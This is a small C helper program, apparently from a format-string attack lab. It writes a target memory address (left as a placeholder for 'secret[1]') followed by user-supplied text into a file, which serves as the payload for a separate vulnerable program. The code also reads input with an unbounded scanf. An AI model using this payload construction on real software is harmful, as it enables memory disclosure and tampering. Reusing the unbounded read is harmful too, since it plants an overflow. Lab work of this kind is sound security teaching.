/* write-string.c */

#include <sys/types.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

int main()
{
    char buf[1000];
    int fp, size;
    unsigned int *address;
    
    /* Putting any number you like at the beginning of the format string */
    address = (unsigned int *) buf;
    *address = "secret[1] address here";  // replace RHS with address of secret[1] without quotes
    
    /* Getting the rest of the format string */
    printf("Enter a string:\n");
    scanf("%s", buf+4);
    size = strlen(buf+4) + 4;
    printf("The string length is %d\n", size);
    
    /* Writing buf to "mystring" */
    fp = open("mystring", O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);
    if (fp != -1) {
        write(fp, buf, size);
        close(fp);
    } else {
        printf("Open failed!\n");
    }

    return 0;
}
